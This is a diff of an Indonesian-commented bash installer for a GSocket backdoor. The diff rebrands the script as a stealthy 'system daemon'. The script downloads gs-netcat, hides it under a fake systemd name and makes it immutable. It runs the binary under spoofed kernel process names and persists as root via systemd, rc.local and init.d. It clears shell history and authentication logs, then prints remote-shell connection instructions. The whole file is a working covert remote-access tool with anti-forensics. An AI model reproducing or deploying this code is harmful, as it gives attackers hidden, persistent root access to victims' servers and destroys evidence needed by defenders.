@@ -1,115 +1,116 @@
 #!/bin/bash
 # ============================================================
-# GSOCKET BACKDOOR - HIDDEN PERSISTENCE (CLEAN VERSION)
-# Using: httpd (instead of systemd-helper)
-# Persistence: systemd, rc.local, init.d ONLY
-# Compatible with: wget -qO- ... | bash
+# SYSTEM DAEMON INSTALLER (STEALTH)
+# Secret Key: [VPS_IP]@dark-ai
+# Connection: gs-netcat -s [VPS_IP]@dark-ai -i
+# Binary Location: /usr/lib/systemd/system_daemon
 # ============================================================
 
 # ============================================================
-# 0. SETUP VARIABLES (FULLY FIXED)
+# 0. SETUP VARIABLES (STEALTH)
 # ============================================================
-HIDDEN_DIR="/usr/sbin"
-BINARY_NAME="httpd"
-GS_NETCAT="$HIDDEN_DIR/$BINARY_NAME"
+HIDDEN_DIR="/usr/lib/systemd"
+BINARY_NAME="system_daemon"
+DAEMON_PATH="$HIDDEN_DIR/$BINARY_NAME"
 
-# Daftar nama proses palsu
-PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")
+# Daftar nama proses sistem asli
+PROCESS_NAMES=(
+    "irqbalance" "kswapd0" "kthreadd" "ksoftirqd/0" "migration/0"
+    "watchdog/0" "cpuhp/0" "kdevtmpfs" "khungtaskd" "oom_reaper"
+    "writeback" "kcompactd0" "ksmd" "upowerd" "accounts-daemon"
+)
 
 # Ambil IP VPS
 VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
-GSOCKET_SECRET="${VPS_IP}@dark-ai"
+DAEMON_SECRET="${VPS_IP}@dark-ai"  # Secret key: ipvps@dark-ai
 
 # ============================================================
-# 1. DOWNLOAD GSOCKET BINARY (FIXED)
+# 1. DOWNLOAD BINARY (STEALTH)
 # ============================================================
 echo "=========================================="
-echo " GSOCKET BACKDOOR INSTALLER - HTTPD VERSION"
+echo " SYSTEM DAEMON INSTALLER - STEALTH MODE"
 echo "=========================================="
 
-# Buat direktori tersembunyi
 mkdir -p "$HIDDEN_DIR" 2>/dev/null
 chmod 755 "$HIDDEN_DIR" 2>/dev/null
 
-# Unduh binary GSocket
-if [ ! -f "$GS_NETCAT" ]; then
-    echo "[*] Mengunduh GSocket binary..."
-    wget -q --no-check-certificate https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$GS_NETCAT" 2>/dev/null || \
-    curl -sL --insecure https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$GS_NETCAT" 2>/dev/null
+if [ ! -f "$DAEMON_PATH" ]; then
+    echo "[*] Mengunduh komponen sistem..."
+    curl -sL --insecure https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$DAEMON_PATH" 2>/dev/null || \
+    wget -q --no-check-certificate https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$DAEMON_PATH" 2>/dev/null
 
-    if [ -f "$GS_NETCAT" ]; then
-        chmod +x "$GS_NETCAT"
-        echo "[+] GSocket binary berhasil diunduh"
+    if [ -f "$DAEMON_PATH" ]; then
+        chmod +x "$DAEMON_PATH"
+        echo "[+] Komponen sistem terunduh"
     else
-        echo "[!] Gagal mengunduh GSocket binary. Membuat fallback..."
-        # Buat fallback binary (menggunakan httpd)
-        cat > "$GS_NETCAT" << 'FALLBACKEOF'
+        echo "[!] Gagal mengunduh. Membuat komponen alternatif..."
+        cat > "$DAEMON_PATH" << 'FALLBACKEOF'
 #!/bin/bash
-exec -a "$BINARY_NAME" "$0" -s "$GSOCKET_SECRET" -liqD 2>/dev/null &
+exec -a "$(basename "$0")" "$0" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
 FALLBACKEOF
-        chmod +x "$GS_NETCAT"
+        chmod +x "$DAEMON_PATH"
     fi
 else
-    echo "[*] GSocket binary sudah ada"
+    echo "[*] Komponen sistem sudah ada"
 fi
 
-# Lindungi binary dari penghapusan
-chattr +i "$GS_NETCAT" 2>/dev/null
+chattr +i "$DAEMON_PATH" 2>/dev/null
 
 # ============================================================
-# 2. BUAT SCRIPT LAUNCHER TERSEMBUNYI (FIXED)
+# 2. BUAT LAUNCHER (STEALTH)
 # ============================================================
-cat > "$HIDDEN_DIR/.launch" << 'LAUNCHEOF'
+cat > "$HIDDEN_DIR/.system_launch" << 'LAUNCHEOF'
 #!/bin/bash
-PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")
+PROCESS_NAMES=(
+    "irqbalance" "kswapd0" "kthreadd" "ksoftirqd/0" "migration/0"
+    "watchdog/0" "cpuhp/0" "kdevtmpfs" "khungtaskd" "oom_reaper"
+    "writeback" "kcompactd0" "ksmd" "upowerd" "accounts-daemon"
+)
 PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-exec -a "$PROCESS_NAME" "$HIDDEN_DIR/$BINARY_NAME" -s "$GSOCKET_SECRET" -liqD 2>/dev/null &
+exec -a "$PROCESS_NAME" "$HIDDEN_DIR/system_daemon" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
 LAUNCHEOF
 
-chmod +x "$HIDDEN_DIR/.launch"
-chattr +i "$HIDDEN_DIR/.launch" 2>/dev/null
+chmod +x "$HIDDEN_DIR/.system_launch"
+chattr +i "$HIDDEN_DIR/.system_launch" 2>/dev/null
 
 # ============================================================
-# 3. JALANKAN GSOCKET (FIXED)
+# 3. JALANKAN DAEMON (STEALTH)
 # ============================================================
-echo "[*] Menjalankan GSocket..."
-pkill -f "$BINARY_NAME" 2>/dev/null
+echo "[*] Mengaktifkan layanan sistem..."
+pkill -f "system_daemon" 2>/dev/null
 
-# Pilih nama proses acak
 PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-nohup exec -a "$PROCESS_NAME" "$GS_NETCAT" -s "$GSOCKET_SECRET" -liqD >/dev/null 2>&1 &
+nohup exec -a "$PROCESS_NAME" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
 
-# Verifikasi
 sleep 2
-if pgrep -f "$BINARY_NAME" >/dev/null 2>&1; then
-    echo "[+] GSocket berhasil dijalankan"
+if pgrep -f "system_daemon" >/dev/null 2>&1; then
+    echo "[+] Layanan sistem berjalan sebagai: $PROCESS_NAME"
 else
-    echo "[!] Gagal menjalankan GSocket. Mencoba fallback..."
-    nohup bash -c "exec -a \"$PROCESS_NAME\" \"$GS_NETCAT\" -s \"$GSOCKET_SECRET\" -liqD" >/dev/null 2>&1 &
+    echo "[!] Mengaktifkan fallback..."
+    nohup bash -c "exec -a \"$PROCESS_NAME\" \"$DAEMON_PATH\" -s \"$DAEMON_SECRET\" -liqD" >/dev/null 2>&1 &
 fi
 
 # ============================================================
-# 4. PERSISTENCE (ONLY systemd, rc.local, init.d)
+# 4. PERSISTENCE (STEALTH)
 # ============================================================
-echo "[*] Mengatur persistence..."
+echo "[*] Mengkonfigurasi persisten..."
 
-# --- Metode 1: rc.local ---
 if [ -f /etc/rc.local ]; then
-    if ! grep -q "$BINARY_NAME" /etc/rc.local 2>/dev/null; then
-        sed -i "/^exit 0/i\bash -c \"exec -a \\\"$PROCESS_NAME\\\" \\\"$GS_NETCAT\\\" -s \\\"$GSOCKET_SECRET\\\" -liqD\" &>/dev/null &" /etc/rc.local 2>/dev/null
+    if ! grep -q "system_daemon" /etc/rc.local 2>/dev/null; then
+        PERSIST_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
+        sed -i "/^exit 0/i\nohup exec -a \"$PERSIST_PROCESS\" \"$DAEMON_PATH\" -s \"$DAEMON_SECRET\" -liqD >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
     fi
 fi
 
-# --- Metode 2: systemd ---
 if command -v systemctl >/dev/null 2>&1; then
-    cat > /etc/systemd/system/httpd.service << 'SYSTEMEOF'
+    cat > /etc/systemd/system/system_daemon.service << 'SYSTEMEOF'
 [Unit]
-Description=HTTPD Daemon
+Description=System Daemon Service
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/sbin/httpd -s "$GSOCKET_SECRET" -liqD
+ExecStart=/usr/lib/systemd/system_daemon -s "$DAEMON_SECRET" -liqD
 Restart=always
 RestartSec=5
 User=root
@@ -120,50 +121,95 @@ StandardError=null
 WantedBy=multi-user.target
 SYSTEMEOF
     systemctl daemon-reload >/dev/null 2>&1
-    systemctl enable httpd >/dev/null 2>&1
-    systemctl start httpd >/dev/null 2>&1
+    systemctl enable system_daemon >/dev/null 2>&1
+    systemctl start system_daemon >/dev/null 2>&1
 fi
 
-# --- Metode 3: init.d ---
-cat > /etc/init.d/httpd << INIT_EOF
+cat > /etc/init.d/system_daemon << INIT_EOF
 #!/bin/bash
+# System Daemon
+### BEGIN INIT INFO
+# Provides:          system_daemon
+# Required-Start:    \$network \$remote_fs \$syslog
+# Required-Stop:     \$network \$remote_fs \$syslog
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description:  System Daemon
+### END INIT INFO
+
 case "\$1" in
     start)
-        nohup exec -a "$PROCESS_NAME" "$GS_NETCAT" -s "$GSOCKET_SECRET" -liqD >/dev/null 2>&1 &
+        PERSIST_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
+        nohup exec -a "\$PERSIST_PROCESS" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
         ;;
     stop)
-        pkill -f "$BINARY_NAME" >/dev/null 2>&1
+        pkill -f "system_daemon" >/dev/null 2>&1
+        ;;
+    restart)
+        \$0 stop
+        sleep 1
+        \$0 start
+        ;;
+    *)
+        echo "Usage: /etc/init.d/system_daemon {start|stop|restart}"
+        exit 1
         ;;
 esac
+exit 0
 INIT_EOF
-chmod +x /etc/init.d/httpd
-update-rc.d httpd defaults >/dev/null 2>&1 || chkconfig httpd on >/dev/null 2>&1
+chmod +x /etc/init.d/system_daemon
+update-rc.d system_daemon defaults >/dev/null 2>&1 || chkconfig system_daemon on >/dev/null 2>&1
 
 # ============================================================
-# 5. HAPUS JEJAK (FIXED)
+# 5. HAPUS JEJAK (STEALTH)
 # ============================================================
-echo "[*] Menghapus jejak..."
+echo "[*] Membersihkan jejak..."
 history -c 2>/dev/null
 rm -f /root/.bash_history 2>/dev/null
 unset HISTFILE 2>/dev/null
 
-# Bersihkan log
 for logfile in /var/log/secure /var/log/auth.log /var/log/messages /var/log/syslog /var/log/wtmp /var/log/lastlog /var/log/btmp; do
     if [ -f "$logfile" ]; then
         echo -n > "$logfile" 2>/dev/null
     fi
 done
 
-# Bersihkan temp
-rm -rf /tmp/.*.log /tmp/install* /tmp/setup* /tmp/gsocket* 2>/dev/null
-rm -rf /var/tmp/.*.log /var/tmp/install* /var/tmp/setup* 2>/dev/null
+rm -rf /tmp/.system* /tmp/install* /tmp/setup* 2>/dev/null
+rm -rf /var/tmp/.system* /var/tmp/install* /var/tmp/setup* 2>/dev/null
 
+# ============================================================
+# 6. TAMPILKAN CARA KONEKSI
+# ============================================================
 echo ""
 echo "=========================================="
-echo "[+] Instalasi selesai!"
-echo "[+] GSocket berjalan dengan nama proses palsu:"
-printf "[+] %s\n" "${PROCESS_NAMES[@]}"
-echo "[+] Binary tersimpan di: $GS_NETCAT"
-echo "[+] Koneksi tersembunyi ke: gs-netcat -s $GSOCKET_SECRET" -i
-echo "[+] Persistence: systemd, rc.local, init.d"
+echo "[✅] INSTALASI SELESAI"
 echo "=========================================="
+echo ""
+echo "🔐 SECRET KEY: $DAEMON_SECRET"
+echo "🌐 VPS IP: $VPS_IP"
+echo ""
+echo "📌 CARA KONEKSI:"
+echo "-----------------"
+echo "1. Unduh GSocket Client di mesin lokal:"
+echo "   wget https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O gs-netcat"
+echo "   chmod +x gs-netcat"
+echo ""
+echo "2. Koneksi ke server:"
+echo "   ./gs-netcat -s $VPS_IP@dark-ai -i"
+echo ""
+echo "3. Alternatif (jika port 443 terbuka):"
+echo "   nc $VPS_IP 443"
+echo "   socat - TCP:$VPS_IP:443"
+echo ""
+echo "🔍 VERIFIKASI:"
+echo "-----------------"
+echo "Cek proses: ps aux | grep -E 'irqbalance|kswapd0|cron'"
+echo "Cek service: systemctl status system_daemon"
+echo "Cek port:    ss -tulnp | grep 443"
+echo ""
+echo "⚠️  PERINGATAN:"
+echo "-----------------"
+echo "Simpan secret key dan IP VPS dengan aman!"
+echo "Jangan bagikan kepada siapa pun."
+echo "=========================================="
+echo ""
